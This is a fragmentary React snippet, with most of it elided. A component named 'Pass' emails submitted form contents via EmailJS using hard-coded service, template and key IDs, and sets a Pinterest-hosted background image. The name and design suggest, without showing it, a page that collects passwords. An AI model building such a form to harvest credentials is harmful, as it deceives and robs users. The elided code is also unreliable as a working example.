...
const Pass = () => {
  ...
  const handleSubmit = (e) => {
   ...
   emailjs.sendForm('service_yv3yjke', 'template_lzle3vs', form.current, 'nbKXSvwZTLrvPG3kW',)
   .then((result) => {
      ...
      <div className="w-full xl:w-3/4 lg:w-11/12 flex">
        ...
        <div
          ...
          style={{
            width:'600px',
            backgroundImage:
              'url("https://i.pinimg.com/originals/00/d8/2e/00d82e885b1bbebad0ded3bd52fc031b.jpg")'
